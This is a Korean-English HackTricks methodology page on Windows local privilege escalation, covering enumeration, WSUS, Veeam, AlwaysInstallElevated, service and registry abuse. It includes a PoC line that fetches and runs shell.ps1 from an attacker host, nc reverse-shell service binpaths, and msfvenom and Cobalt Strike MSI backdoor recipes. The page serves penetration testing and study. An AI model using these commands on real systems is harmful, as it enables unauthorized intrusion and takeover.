# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors를 찾는 데 가장 좋은 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Windows Access Tokens가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 내용은 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows에서 integrity levels가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows에는 시스템 열거를 **막거나**, 실행 파일 실행을 막거나, 심지어 **활동을 탐지**할 수 있는 여러 요소가 있습니다. privilege escalation 열거를 시작하기 전에 다음 **page**를 **읽고**, 이 모든 **defenses** **mechanisms**를 **열거**해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess`를 통해 실행된 UIAccess 프로세스는 AppInfo secure-path checks를 우회할 경우 프롬프트 없이 High IL에 도달하는 데 악용될 수 있습니다. 전용 UIAccess/Admin Protection bypass workflow는 여기에서 확인하세요:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation은 임의의 SYSTEM registry write (RegPwn)에 악용될 수 있습니다:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

최근 Windows builds에는 재사용된 SMB TCP connection 위로 특권이 있는 로컬 NTLM authentication을 반사시키는 **SMB arbitrary-port** LPE 경로도 도입되었습니다:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows version에 알려진 취약점이 있는지 확인하세요(적용된 patches도 함께 확인).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

이 [site](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft 보안 취약점의 자세한 정보를 검색하는 데 유용하다. 이 데이터베이스에는 4,700개가 넘는 보안 취약점이 있어, Windows 환경이 제공하는 **방대한 attack surface**를 보여준다.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env 변수에 저장된 credential/Juicy 정보가 있는가?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)을 통해 이를 켜는 방법을 배울 수 있습니다.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell 모듈 로깅

PowerShell 파이프라인 실행의 세부 정보가 기록되며, 실행된 명령, 명령 호출, 그리고 스크립트의 일부를 포함합니다. 그러나 전체 실행 세부 정보와 출력 결과는 캡처되지 않을 수 있습니다.

이를 활성화하려면 문서의 "Transcript files" 섹션의 지침을 따르되, **"Powershell Transcription"** 대신 **"Module Logging"**을 선택하세요.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell 로그의 마지막 15개 이벤트를 보려면 다음을 실행할 수 있습니다:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

스크립트 실행의 완전한 활동 및 전체 내용 기록이 캡처되어, 실행되는 모든 코드 블록이 문서화되도록 보장합니다. 이 과정은 각 활동에 대한 포괄적인 감사 추적을 보존하며, 포렌식과 악성 행위 분석에 유용합니다. 실행 시점에 모든 활동을 문서화함으로써, 프로세스에 대한 상세한 인사이트를 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block의 로깅 이벤트는 Windows Event Viewer에서 다음 경로에 위치할 수 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
마지막 20개의 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트가 http**S**가 아니라 http를 사용하여 요청되는 경우 시스템을 침해할 수 있습니다.

cmd에서 다음을 실행하여 네트워크가 비-SSL WSUS 업데이트를 사용하는지 확인하는 것으로 시작합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서 다음과 같이:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
만약 다음과 같은 응답을 받는다면:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
서비스는 명령을 SYSTEM으로 실행합니다.
## KrbRelayUp

특정 조건에서 Windows **domain** 환경에 **local privilege escalation** 취약점이 존재합니다. 이 조건에는 **LDAP signing**이 강제되지 않는 환경, 사용자가 **Resource-Based Constrained Delegation (RBCD)** 를 구성할 수 있는 self-rights를 보유한 경우, 그리고 사용자가 domain 내에서 컴퓨터를 생성할 수 있는 기능이 포함됩니다. 중요한 점은 이러한 **requirements**가 **default settings**로 충족된다는 것입니다.

**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)을 찾으세요.

공격 흐름에 대한 자세한 정보는 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)를 확인하세요.

## AlwaysInstallElevated

이 2개의 register가 **enabled** 되어 있고(값이 **0x1**), 그러면 어떤 권한 수준의 사용자든 `*.msi` 파일을 NT AUTHORITY\\**SYSTEM**으로 **install**(execute)할 수 있습니다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter 세션이 있다면 **`exploit/windows/local/always_install_elevated`** 모듈을 사용해 이 기법을 자동화할 수 있습니다.

### PowerUP

power-up의 `Write-UserAddMSI` 명령을 사용해 현재 디렉터리 안에 권한 상승을 위한 Windows MSI 바이너리를 생성합니다. 이 스크립트는 사용자/그룹 추가를 요청하는 미리 컴파일된 MSI 설치 프로그램을 작성합니다(따라서 GUI 접근이 필요합니다):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

이 도구를 사용하여 MSI wrapper를 만드는 방법을 배우려면 이 튜토리얼을 읽으세요. **.bat** 파일을 **그냥** **명령줄을 실행**하고 싶을 때 감쌀 수 있다는 점에 유의하세요


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- **Visual Studio**를 열고, **Create a new project**를 선택한 뒤 검색 상자에 "installer"를 입력합니다. **Setup Wizard** 프로젝트를 선택하고 **Next**를 클릭합니다.
- 프로젝트 이름을 **AlwaysPrivesc** 같은 것으로 지정하고, 위치는 **`C:\privesc`**를 사용한 뒤 **place solution and project in the same directory**를 선택하고 **Create**를 클릭합니다.
- 4단계 중 3단계(포함할 파일 선택)에 도달할 때까지 **Next**를 계속 클릭합니다. **Add**를 클릭하고 방금 생성한 Beacon payload를 선택한 뒤 **Finish**를 클릭합니다.
- **Solution Explorer**에서 **AlwaysPrivesc** 프로젝트를 선택하고, **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경합니다.
- **Author**와 **Manufacturer** 같은 다른 속성도 변경할 수 있으며, 이렇게 하면 설치된 앱이 더 그럴듯해 보일 수 있습니다.
- 프로젝트를 마우스 오른쪽 버튼으로 클릭하고 **View > Custom Actions**를 선택합니다.
- **Install**을 마우스 오른쪽 버튼으로 클릭하고 **Add Custom Action**을 선택합니다.
- **Application Folder**를 더블클릭하고, **beacon.exe** 파일을 선택한 다음 **OK**를 클릭합니다. 이렇게 하면 설치 프로그램이 실행되는 즉시 beacon payload가 실행됩니다.
- **Custom Action Properties** 아래에서 **Run64Bit**를 **True**로 변경합니다.
- 마지막으로 **build it**.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` 경고가 표시되면 플랫폼을 x64로 설정했는지 확인하세요.

### MSI Installation

악성 `.msi` 파일의 **installation**을 **background**에서 실행하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 익스플로잇하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## 백신과 탐지기

### 감사 설정

이 설정들은 무엇이 **로그**되는지를 결정하므로, 주의해야 합니다
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding는 로그가 어디로 전송되는지 알아두면 유용하다
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 **로컬 Administrator 비밀번호 관리**를 위해 설계되었으며, 도메인에 가입된 컴퓨터에서 각 비밀번호가 **고유하고, 무작위이며, 정기적으로 갱신**되도록 보장합니다. 이러한 비밀번호는 Active Directory에 안전하게 저장되며, ACL을 통해 충분한 권한을 부여받은 사용자만 접근할 수 있어, 승인된 경우 로컬 admin 비밀번호를 볼 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화되어 있으면, **평문 비밀번호가 LSASS** (Local Security Authority Subsystem Service)에 저장됩니다.\
[**이 페이지에서 WDigest에 대한 더 많은 정보**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA 보호

**Windows 8.1**부터 Microsoft는 신뢰되지 않은 프로세스가 **메모리를 읽거나** 코드를 주입하려는 시도를 **차단**하기 위해 Local Security Authority (LSA)에 대한 향상된 보호 기능을 도입하여 시스템 보안을 강화했습니다.\
[**LSA Protection에 대한 자세한 정보는 여기**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에서 도입되었습니다. 그 목적은 pass-the-hash attacks와 같은 위협으로부터 디바이스에 저장된 credentials를 보호하는 것입니다.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 캐시된 자격 증명

**도메인 자격 증명**은 **Local Security Authority** (LSA)에 의해 인증되며 운영 체제 구성 요소에 의해 사용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에 의해 인증되면, 일반적으로 해당 사용자에 대한 도메인 자격 증명이 생성됩니다.\
[**Cached Credentials에 대한 더 많은 정보는 여기**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 사용자 및 그룹

### 사용자 및 그룹 열거

자신이 속한 그룹들 중 interesting permissions를 가진 그룹이 있는지 확인해야 합니다.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

만약 **어떤 privileged group에 속해 있다면 privileges를 escalate할 수 있을 수도 있습니다**. privileged groups와 이를 abuse해서 privileges를 escalate하는 방법은 여기에서 알아보세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Token이 무엇인지 더 알아보려면** 이 페이지를 확인하세요: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
흥미로운 tokens에 대해 **알아보고**, 이를 abuse하는 방법은 다음 페이지를 확인하세요:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Home 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 비밀번호 정책
```bash
net accounts
```
### 클립보드의 내용을 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

먼저, 프로세스를 나열할 때 **프로세스의 command line 안에 비밀번호가 있는지 확인**하세요.\
실행 중인 어떤 binary를 **덮어쓸 수 있는지**, 또는 binary 폴더에 write 권한이 있는지 확인하여 가능한 [**DLL Hijacking attacks**](dll-hijacking/index.html)를 exploit하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 바이너리의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 바이너리 폴더의 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump**를 사용하면 sysinternals의 실행 중인 프로세스의 memory dump를 생성할 수 있습니다. FTP 같은 서비스는 **credentials가 memory에 clear text로 존재**하므로, memory를 dump해서 credentials를 읽어보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM으로 실행 중인 Applications는 사용자가 CMD를 띄우거나 디렉터리를 탐색할 수 있게 허용할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1), "command prompt"를 검색하고 "Click to open Command Prompt"를 클릭

## Services

Service Triggers는 특정 조건이 발생할 때 Windows가 service를 시작하도록 합니다(예: named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh 등). SERVICE_START 권한이 없어도 trigger를 발생시켜 privileged services를 시작할 수 있는 경우가 많습니다. 여기서 enumeration 및 activation techniques를 확인하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

서비스 목록 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

**sc**를 사용하여 서비스에 대한 정보를 얻을 수 있습니다
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하기 위해 _Sysinternals_의 이진 파일 **accesschk**를 사용하는 것이 권장된다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
권장 사항은 "Authenticated Users"가 어떤 서비스든 수정할 수 있는지 확인하는 것입니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

다음 오류가 발생한다면 (예: SSDPSRV에서):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

다음을 사용해 활성화할 수 있습니다
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**서비스 `upnphost`는 작동하려면 SSDPSRV에 의존합니다(XP SP1의 경우)**

**이 문제의 또 다른 우회 방법**은 다음을 실행하는 것입니다:
```
sc.exe config usosvc start= auto
```
### **서비스 바이너리 경로 수정**

"Authenticated users" 그룹이 서비스에 대해 **SERVICE_ALL_ACCESS**를 보유한 경우, 해당 서비스의 실행 파일 바이너리를 수정할 수 있습니다. **sc**를 수정하고 실행하려면:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
권한은 다양한 권한을 통해 상승될 수 있습니다:

- **SERVICE_CHANGE_CONFIG**: 서비스 바이너리의 재구성을 허용합니다.
- **WRITE_DAC**: 권한 재구성을 가능하게 하며, 서비스 구성을 변경할 수 있게 합니다.
- **WRITE_OWNER**: 소유권 획득과 권한 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 구성을 변경할 수 있는 기능을 상속합니다.
- **GENERIC_ALL**: 역시 서비스 구성을 변경할 수 있는 기능을 상속합니다.

이 취약점의 탐지와 exploitation에는 _exploit/windows/local/service_permissions_를 활용할 수 있습니다.

### Services binaries weak permissions

서비스가 실행하는 binary를 수정할 수 있는지, 또는 binary가 위치한 폴더에 대해 **write permissions**가 있는지 **확인하세요** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic**(system32가 아닌 곳)으로 서비스가 실행하는 모든 binary를 확인하고 **icacls**로 권한을 확인할 수 있습니다:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
또한 **sc** 및 **icacls**를 사용할 수도 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 서비스 registry modify permissions

서비스 registry를 수정할 수 있는지 확인해야 합니다.\
service **registry**에 대한 **permissions**를 다음과 같이 **check**할 수 있습니다:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 합니다. 그렇다면 서비스가 실행하는 binary를 변경할 수 있습니다.

실행되는 binary의 Path를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

일부 Windows Accessibility 기능은 사용자별 **ATConfig** 키를 생성하고, 이후 **SYSTEM** 프로세스가 이를 HKLM 세션 키로 복사합니다. registry **symbolic link race**를 이용하면 이 권한 있는 write를 **임의의 HKLM path**로 리다이렉트할 수 있어, arbitrary HKLM **value write** primitive를 얻을 수 있습니다.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`는 설치된 accessibility 기능을 나열합니다.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`는 사용자 제어 가능한 설정을 저장합니다.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`는 logon/secure-desktop 전환 중 생성되며 사용자가 write할 수 있습니다.

Abuse flow (CVE-2026-24291 / ATConfig):

1. **SYSTEM**이 write하게 만들고 싶은 **HKCU ATConfig** value를 채웁니다.
2. secure-desktop copy를 트리거합니다(예: **LockWorkstation**). 그러면 AT broker flow가 시작됩니다.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`에 **oplock**을 걸어 **race**를 이깁니다. oplock이 발생하면 **HKLM Session ATConfig** key를 보호된 HKLM target으로 향하는 **registry link**로 교체합니다.
4. SYSTEM이 공격자가 선택한 value를 리다이렉트된 HKLM path에 write합니다.

임의의 HKLM value write를 얻으면, service configuration value를 덮어써서 LPE로 pivot할 수 있습니다:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

일반 사용자가 시작할 수 있는 service(예: **`msiserver`**)를 선택하고 write 후 이를 trigger합니다. **Note:** public exploit implementation은 race의 일부로 **lock the workstation**을 사용합니다.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

레지스트리에 대해 이 권한이 있다면, **이 레지스트리 아래에 하위 레지스트리를 생성할 수 있다**는 뜻입니다. Windows 서비스의 경우, 이는 **임의 코드 실행에 충분합니다:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

실행 파일 경로가 따옴표로 감싸져 있지 않으면, Windows는 공백 앞의 각 끝부분을 모두 실행하려고 시도합니다.

예를 들어, 경로 _C:\Program Files\Some Folder\Service.exe_ 에 대해 Windows는 다음을 실행하려고 시도합니다:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
모든 unquoted service paths를 나열하되, 기본 제공 Windows 서비스에 속한 것은 제외하세요:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
